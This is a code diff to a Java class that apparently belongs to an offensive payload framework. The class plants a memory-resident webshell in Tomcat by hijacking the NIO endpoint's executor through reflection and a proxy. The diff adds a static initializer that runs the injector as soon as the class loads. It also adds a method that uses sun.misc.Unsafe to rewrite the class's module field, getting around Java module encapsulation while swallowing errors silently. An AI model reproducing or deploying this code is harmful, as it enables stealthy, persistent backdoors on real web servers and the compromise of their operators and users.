@@ -5,6 +5,7 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -26,7 +27,9 @@ import java.util.zip.GZIPInputStream;
 public class TomcatAutoFindExecutorThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
-
+    static {
+        new TomcatAutoFindExecutorThreadLoader();
+    }
     public TomcatAutoFindExecutorThreadLoader() {
         try {
             // 获取
@@ -43,6 +46,7 @@ public class TomcatAutoFindExecutorThreadLoader {
     }
 
     public static void inject(Object nioEndpoint) throws Exception {
+        addModule();
         Object threadPoolExecutor = getFieldValue(nioEndpoint, "executor");
         if (threadPoolExecutor instanceof Proxy) {
             if (getFieldValue(threadPoolExecutor, "h").getClass().getName().equals(CLASSNAME)) {
@@ -324,4 +328,22 @@ public class TomcatAutoFindExecutorThreadLoader {
         return null;
     }
 
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = TomcatAutoFindExecutorThreadLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
+
+        }
+    }
 }
